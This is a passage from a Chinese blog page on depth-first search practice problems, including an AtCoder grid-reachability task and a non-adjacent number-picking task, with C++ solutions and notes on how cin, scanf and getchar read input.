class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//如果有一项维生素比牛需要的维生素要少，直接返回false </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">search</span><span class="params">(<span class="type">int</span> t,<span class="type">int</span> s)</span><span class="comment">//搜索的函数 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(t&gt;m)<span class="comment">//边界</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">pd</span>(s))<span class="comment">//必须得满足条件</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(s&lt;minn)<span class="comment">//判断选的饲料的总数小于以前的最优解</span></span><br><span class="line">&#123;</span><br><span class="line">minn=s;<span class="comment">//替换掉</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=minn; i++)</span><br><span class="line">&#123;</span><br><span class="line">ans[i]=c[i];<span class="comment">//答案的数组也要被替换</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>; <span class="comment">//返回</span></span><br><span class="line">&#125;</span><br><span class="line">c[s+<span class="number">1</span>]=t;<span class="comment">//把t放在数组里</span></span><br><span class="line"><span class="built_in">search</span>(t+<span class="number">1</span>,s+<span class="number">1</span>);<span class="comment">//搜索一步</span></span><br><span class="line">c[s+<span class="number">1</span>]=<span class="number">0</span>;<span class="comment">//回溯一步</span></span><br><span class="line"><span class="built_in">search</span>(t+<span class="number">1</span>,s);<span class="comment">//如果不选第t种饲料的操作</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span><span class="comment">//主函数部分</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cin&gt;&gt;n;<span class="comment">//读入</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=n; i++)</span><br><span class="line">cin&gt;&gt;a[i];<span class="comment">//读入</span></span><br><span class="line">cin&gt;&gt;m;<span class="comment">//读入</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=m; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>; j&lt;=n; j++)</span><br><span class="line">cin&gt;&gt;b[i][j];<span class="comment">//还是读入</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">search</span>(<span class="number">1</span>,<span class="number">0</span>);<span class="comment">//调用搜索函数</span></span><br><span class="line">cout&lt;&lt;minn&lt;&lt;<span class="string">&#x27; &#x27;</span>;<span class="comment">//输出</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=minn; i++)</span><br><span class="line">cout&lt;&lt;ans[i]&lt;&lt;<span class="string">&#x27; &#x27;</span>;<span class="comment">//还是输出</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//结束程序</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写这个主要是因为第一眼还是 dx，dy 类型的深搜，刚开始手足无措没有想到如何处理这种 0，1 状态的深搜使其能搜索所有的状态。</p><p>下面再贴一道纯模板题</p><hr><h1 id="深さ優先探索"><a class="markdownIt-Anchor" href="#深さ優先探索">#</a> 深さ優先探索</h1><h2 id="题面翻译"><a class="markdownIt-Anchor" href="#题面翻译">#</a> 题面翻译</h2><p>高桥先生住的小区是长方形的，被划分成一个个格子。高桥先生想从家里去鱼店，高桥先生每次可以走到他前后左右四个格子中的其中一个，但不能斜着走，也不能走出小区。</p><p>现在给出地图：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">```g```：代表鱼店</span><br><span class="line"></span><br><span class="line">```.```：代表道路</span><br><span class="line"></span><br><span class="line">```#```：代表墙壁</span><br><span class="line"></span><br><span class="line">高桥先生不能穿过墙壁。</span><br><span class="line"></span><br><span class="line">输入：第一行输入n(1&lt;=n&lt;=500),m(1&lt;=m&lt;=500)代表小区的长和宽，接下来n行每行m个字符，描述小区中的每个格子。</span><br><span class="line"></span><br><span class="line">输出：如果高桥先生能到达鱼店，输出&quot;Yes&quot;，否则输出&quot;No&quot;。</span><br><span class="line"></span><br><span class="line">## 题目描述</span><br><span class="line"></span><br><span class="line">[problemUrl]: https://atcoder.jp/contests/atc001/tasks/dfs_a</span><br><span class="line"></span><br><span class="line">この問題は、講座用問題です。ページ下部に解説が掲載されています。</span><br><span class="line"></span><br><span class="line">高橋君の住む街は長方形の形をしており、格子状の区画に区切られています。 長方形の各辺は東西及び南北に並行です。 各区画は道または塀のどちらかであり、高橋君は道を東西南北に移動できますが斜めには移動できません。 また、塀の区画は通ることができません。</span><br><span class="line"></span><br><span class="line">高橋君が、塀を壊したりすることなく道を通って魚屋にたどり着けるかどうか判定してください。</span><br><span class="line"></span><br><span class="line">## 输入格式</span><br><span class="line"></span><br><span class="line">入力は以下の形式で標準入力から与えられる。</span><br><span class="line"></span><br><span class="line">&gt; $ H $ $ W $ $ c_&#123;0,0&#125; $ $ c_&#123;0,1&#125; $ $ c_&#123;0,W-1&#125; $ $ c_&#123;1,0&#125; $ $ c_&#123;1,1&#125; $ $ c_&#123;1,W-1&#125; $ : $ c_&#123;H-1,0&#125; $ $ c_&#123;H-1,1&#125; $ $ c_&#123;H-1,W-1&#125; $</span><br><span class="line"></span><br><span class="line">- $ 1 $ 行目には、街の南北の長さとして整数 $ H(1≦H≦500) $ と東西の長さとして整数 $ W(1≦W≦500) $ が空白で区切られて与えられる。</span><br><span class="line">- $ 2 $ 行目からの $ H $ 行には、格子状の街の各区画における状態 $ c_&#123;i,j&#125;(0≦i≦H-1,\ 0≦j≦W-1) $ が与えられる。 </span><br><span class="line">  - $ i $ 行目 $ j $ 文字目の文字 $ c_&#123;i,j&#125; $ はそれぞれ `s`, `g`, `.`, `#` のいずれかで与えられ、座標 $ (j,i) $ が下記のような状態であることを表す。 </span><br><span class="line">      - `s` : その区画が家であることを表す。</span><br><span class="line">      - `g` : その区画が魚屋であることを表す。</span><br><span class="line">      - `.` : その区画が道であることを表す。</span><br><span class="line">      - `#` : その区画が塀であることを表す。</span><br><span class="line">  - 高橋君は家・魚屋・道は通ることができるが、塀は通ることができない。</span><br><span class="line">  - 与えられた街の外を通ることはできない。</span><br><span class="line">  - `s` と `g` はそれぞれ 1 つずつ与えられる。</span><br><span class="line"></span><br><span class="line">## 输出格式</span><br><span class="line"></span><br><span class="line">塀を $ 1 $ 回も壊さずに、家から魚屋まで辿り着くことができる場合は `Yes`、辿りつけない場合は `No` を標準出力に $ 1 $ 行で出力せよ。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 题解</span><br><span class="line"></span><br><span class="line">这道题就纯是最常见也是最简单的DFS了，多了一个字符串的转换，这里也可以复习一下getchar()函数和cin和scanf函数，</span><br><span class="line"></span><br><span class="line">&gt;**cin从第一个非空格、非回车、非tab键的位置开始读取，当与所要读取类型一致时则开始读取，遇上空格、tab键不再读取、回车结束。**</span><br><span class="line"></span><br><span class="line">&gt;输入缓冲区有数据：从输入缓冲区读取，从非空字符开始，遇到空格结束(回车、空格、tab)。尾回车会被留在输入缓冲区，并且不做处理。</span><br><span class="line">  输入缓冲区没有数据：获取键盘输入，当按下回车的时候，输入的数据连同刚按下的回车符被送入输入缓冲区。然后从输入缓冲区区读取数据，规则和上面标黄部分一样。</span><br><span class="line"></span><br><span class="line">&gt;1、scanf从非空格字符开始读取，空格字符结束(空格、TAB、回车)</span><br><span class="line">   2、当缓冲区没有数据的时候，需要先从键盘输入，然后放入缓冲区再读取。</span><br><span class="line">   3、当缓冲区有数据的时候不会从键盘获取数据。我们可以从上面输入看到第二个sacnf并没有从键盘获取数据</span><br><span class="line">   4、sacnf会把末尾回车留在缓冲区，给以后的输入埋雷</span><br><span class="line"></span><br><span class="line">接着贴上代码</span><br><span class="line"></span><br><span class="line">```cpp</span><br><span class="line">#include&lt;bits/stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int map1[502][502];</span><br><span class="line">int record[502][502];</span><br><span class="line">#define xx x+dx[i]</span><br><span class="line">#define yy y+dy[i]</span><br><span class="line">int sx,sy,fx,fy;</span><br><span class="line">int dx[4]=&#123;0,0,1,-1&#125;;</span><br><span class="line">int dy[4]=&#123;1,-1,0,0&#125;;</span><br><span class="line">int n,m;</span><br><span class="line">int flag=0;</span><br><span class="line">void dfs(int x,int y)&#123;</span><br><span class="line">record[x][y]=1;</span><br><span class="line">if(x==fx&amp;&amp;y==fy)&#123;</span><br><span class="line">flag=1;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">if(!flag)</span><br><span class="line">for(int i=0;i&lt;4;i++)&#123;</span><br><span class="line">if(xx&lt;=n&amp;&amp;x&gt;0&amp;&amp;y&lt;=m&amp;&amp;y&gt;0&amp;&amp;map1[xx][yy]==0&amp;&amp;record[xx][yy]==0)&#123;</span><br><span class="line">dfs(xx,yy);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">getchar();</span><br><span class="line">for(int i=1;i&lt;=n;i++)&#123;</span><br><span class="line">for(int j=1;j&lt;=m;j++)&#123;</span><br><span class="line">char tmp;</span><br><span class="line">tmp = getchar();</span><br><span class="line">if(tmp==&#x27;s&#x27;)&#123;</span><br><span class="line">sx = i,sy = j;</span><br><span class="line">map1[i][j]=0;</span><br><span class="line">&#125;</span><br><span class="line">else if(tmp == &#x27;#&#x27;)&#123;</span><br><span class="line">map1[i][j]=1;</span><br><span class="line">&#125;</span><br><span class="line">else if(tmp == &#x27;g&#x27;)&#123;</span><br><span class="line">fx=i,fy=j;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">map1[i][j] = 0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">getchar();</span><br><span class="line">&#125;</span><br><span class="line">dfs(sx,sy);</span><br><span class="line">if(flag)&#123;</span><br><span class="line">cout&lt;&lt;&quot;Yes&quot;&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">cout&lt;&lt;&quot;No&quot;&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再上一题 dfs，其实这一题和放的第一题是同一种类型，或者说是第一和第二的结合，在二维数组中每个元组有选和不选两种状态，这时候应该的做法。<br>先上题目：</p><h1 id="取数游戏"><a class="markdownIt-Anchor" href="#取数游戏">#</a> 取数游戏</h1><h2 id="题目描述-2"><a class="markdownIt-Anchor" href="#题目描述-2">#</a> 题目描述</h2><p>一个 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>×</mo><mi>M</mi></mrow><annotation encoding="application/x-tex">N\times M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> 的由非负整数构成的数字矩阵，你需要在其中取出若干个数字，使得取出的任意两个数字不相邻（若一个数字在另外一个数字相邻 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>8</mn></mrow><annotation encoding="application/x-tex">8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">8</span></span></span></span> 个格子中的一个即认为这两个数字相邻），求取出数字和最大是多少。</p><h2 id="输入格式-2"><a class="markdownIt-Anchor" href="#输入格式-2">#</a> 输入格式</h2><p>第一行有一个正整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span>，表示了有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span> 组数据。</p><p>对于每一组数据，第一行有两个正整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>，表示了数字矩阵为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> 列。</p><p>接下来 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 行，每行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> 个非负整数，描述了这个数字矩阵。</p><h1 id="题解-2"><a class="markdownIt-Anchor" href="#题解-2">#</a> 题解</h1><p>这里不给出样例输入输出了<br>因为数据量小，直接暴力深搜。</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> T;</span><br><span class="line"><span class="type">int</span> N,M;</span><br><span class="line"><span class="type">int</span> map[<span class="number">9</span>][<span class="number">9</span>];</span><br><span class="line"><span class="type">int</span> maxsum = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> enable[<span class="number">8</span>][<span class="number">8</span>];</span><br><span class="line"><span class="type">int</span> dx[<span class="number">8</span>]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="type">int</span> dy[<span class="number">8</span>]=&#123;<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="type">int</span> currentsum = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> xx x+dx[i]</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> yy y+dy[i]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">search</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(y == M+<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">search</span>(x+<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(x == N+<span class="number">1</span>)&#123;</span><br><span class="line">maxsum = <span class="built_in">max</span>(maxsum,currentsum);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">search</span>(x,y+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(enable[x][y]==<span class="number">0</span>)&#123;</span><br><span class="line">currentsum += map[x][y];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">enable[xx][yy]++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">search</span>(x,y+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">enable[xx][yy]--;</span><br><span class="line">&#125;</span><br><span class="line">currentsum-=map[x][y]; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cin&gt;&gt;T;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=T;i++)&#123;</span><br><span class="line"><span class="comment">//memset(enable,0,sizeof(enable));</span></span><br><span class="line"><span class="comment">//memset(map,0,sizeof(map));//在做每个数据前都要初始化数组 </span></span><br><span class="line">cin&gt;&gt;N&gt;&gt;M;</span><br><span class="line">maxsum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=N;j++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">1</span>;k&lt;=M;k++)&#123;</span><br><span class="line">cin&gt;&gt;map[j][k];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">currentsum=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">search</span>(<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">cout&lt;&lt;maxsum&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure><p>这里我第一次写代码时，并没有考虑到所有的情况，向上面这样写才能考虑到所有的情况，因为你需要考虑到每个元组选或不选，要在 search 中体现出来。而我第一次写代码时默认都选择，进行了 n*m 的循环寻找，自然会少一些情况。这算是本题的一点收获。</p><h2 id="题目描述-3"><a class="markdownIt-Anchor" href="#题目描述-3">#</a> 题目描述</h2><p>给出一个 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 个顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> 条边的无向无权图，顶点编号为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>∼</mo><mi>N</mi></mrow><annotation encoding="application/x-tex">1\sim N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>。问从顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span> 开始，到其他每个点的最短路有几条。</p><h2 id="输入格式-3"><a class="markdownIt-Anchor" href="#输入格式-3">#</a> 输入格式</h2><p>第一行包含 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span> 个正整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo separator="true">,</mo><mi>M</mi></mrow><annotation encoding="application/x-tex">N,M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span>，为图的顶点数与边数。</p><p>接下来 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span> 行，每行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span> 个正整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo separator="true">,</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">x,y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span>，表示有一条由顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span></span></span></span> 连向顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span> 的边，请注意可能有自环与重边。</p><h2 id="输出格式-2"><a class="markdownIt-Anchor" href="#输出格式-2">#</a> 输出格式</h2><p>共 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 行，每行一个非负整数，第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span></span></span></span> 行输出从顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span> 到顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span></span></span></span> 有多少条不同的最短路，由于答案有可能会很大，你只需要输出 $ ans \bmod 100003$ 后的结果即可。如果无法到达顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span></span></span></span> 则输出 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>。</p><h2 id="样例-1-2"><a class="markdownIt-Anchor" href="#样例-1-2">#</a> 样例 #1</h2><h3 id="样例输入-1-2"><a class="markdownIt-Anchor" href="#样例输入-1-2">#</a> 样例输入 #1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5 7</span><br><span class="line">1 2</span><br><span class="line">1 3</span><br><span class="line">2 4</span><br><span class="line">3 4</span><br><span class="line">2 3</span><br><span class="line">4 5</span><br><span class="line">4 5</span><br></pre></td></tr></table></figure><h3 id="样例输出-1-2"><a class="markdownIt-Anchor" href="#样例输出-1-2">#</a> 样例输出 #1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">4</span><br></pre></td></tr></table></figure><h2 id="提示-2"><a class="markdownIt-Anchor" href="#提示-2">#</a> 提示</h2><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span> 到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn></mrow><annotation encoding="application/x-tex">5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span></span></span></span> 的最短路有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span></span></span></span> 条，分别为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span> 条 <span class="katex"><span class="katex-mathml"><math 